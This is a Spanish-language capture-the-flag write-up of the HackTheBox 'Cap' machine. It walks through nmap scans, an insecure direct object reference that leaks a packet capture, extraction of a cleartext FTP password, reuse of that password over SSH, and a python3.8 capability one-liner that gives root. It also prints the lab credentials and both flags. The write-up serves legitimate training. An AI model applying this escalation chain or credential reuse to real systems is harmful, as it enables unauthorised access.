---
icon: flag
---

# Cap HackTheBox (Easy)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-25 11:48 EDT
Nmap scan report for 10.10.10.245
Host is up (0.034s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.64 seconds
```

Veremos varios puertos interesantes, entre ellos el `FTP` y el `80`, si entramos en el puerto `80` veremos una especie de `dashboard` con informacion con lo que parece ser ya un usuario logueado llamado `nathan`.

Si nos vamos al boton `Security Snapshot ...` veremos que nos muestra el numero de paquetes capturados a nivel de red, etc... Pero si observamos la `URL` veremos lo siguiente:

```
URL = http://<IP>/data/7
```

Vemos que se cargan los archivos respecto con el numero de la `URL` ya que si le damos a `download` nos descarga dicho archivo, si probamos el numero `6`, nos descarga dicho numero, despues de un rato probando numeros veremos que el numero `0` es uno bastante interesante.

```
URL = http://<IP>/data/0
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-25 180729.png" alt=""><figcaption></figcaption></figure>

Cuando le demos a `download` nos descarga el archivo de dicho numero, si lo analizamos el `.pacap` con `wireshark` veremos varios paquetes de `TCP` y sobre todo de `FTP` que es lo mas interesante, vamos a filtrarlo por `ftp`:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-25 180906.png" alt=""><figcaption></figcaption></figure>

Si vamos a la linea llamada `USER nathan ...`, le damos click derecho y a la opcion llamada `Follow -> TCP Stream` para seguir el seguimiento de peticiones a nivel de red y veremos esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-25 181048.png" alt=""><figcaption></figcaption></figure>

Vemos que registro la contraseña del usuario `nathan` del `FTP`, vamos a probar dichas credenciales por `FTP` obtenidas.

```
User: nathan
Pass: Buck3tH4TF0RM3!
```

## Escalate user nathan

Ahora en `FTP`:

```shell
ftp nathan@<IP>
```

Metemos como contraseña `Buck3tH4TF0RM3!`...

```
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||41069|)
150 Here comes the directory listing.
drwxr-xr-x    7 1001     1001         4096 Sep 25 15:56 .
drwxr-xr-x    3 0        0            4096 May 23  2021 ..
lrwxrwxrwx    1 0        0               9 May 15  2021 .bash_history -> /dev/null
-rw-r--r--    1 1001     1001          220 Feb 25  2020 .bash_logout
-rw-r--r--    1 1001     1001         3771 Feb 25  2020 .bashrc
drwx------    2 1001     1001         4096 May 23  2021 .cache
drwx------    3 1001     1001         4096 Sep 25 14:23 .gnupg
drwxrwxr-x    3 1001     1001         4096 Sep 25 07:58 .local
-rw-r--r--    1 1001     1001          807 Feb 25  2020 .profile
-rw-------    1 1001     1001           17 Sep 25 10:22 .python_history
drwx------    2 1001     1001         4096 Sep 25 15:56 .ssh
lrwxrwxrwx    1 0        0               9 May 27  2021 .viminfo -> /dev/null
drwxr-xr-x    3 1001     1001         4096 Sep 25 07:46 snap
-r--------    1 1001     1001           33 Sep 25 04:02 user.txt
226 Directory send OK.
```

Veremos que ha funcionado y no solo es un `FTP`, si no que es la propia maquina entera, si probamos esto por `SSH` veremos lo siguiente:

### SSH

```shell
ssh nathan@<IP>
```

Metemos como contraseña `Buck3tH4TF0RM3!`...

```
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Sep 25 16:15:19 UTC 2025

  System load:           0.03
  Usage of /:            36.9% of 8.73GB
  Memory usage:          38%
  Swap usage:            0%
  Processes:             249
  Users logged in:       1
  IPv4 address for eth0: 10.10.10.245
  IPv6 address for eth0: dead:beef::250:56ff:fe94:90a5

  => There are 4 zombie processes.


63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Sep 25 15:54:44 2025 from 10.10.16.90
nathan@cap:~$ whoami
nathan
```

Veremos que ha funcionado tambien, por lo que vamos a leer la `flag` del usuario.

> user.txt

```
54da78dcbbae206dc6dd035bac579d10
```

## Escalate Privileges

Si ejecutamos `linpeas.sh` obteniendolo de la pagina:

URL = [Linpeas.sh Download](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

Veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-25 183003.png" alt=""><figcaption></figcaption></figure>

Vemos que hay una `capabilitie` de `python3.8`, por lo que nosotros podremos realizar lo siguiente:

```shell
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Info:

```
root@cap:/tmp# whoami
root
```

Con esto veremos que seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
9a311512457e9fa05c20863d21f73b5b
```
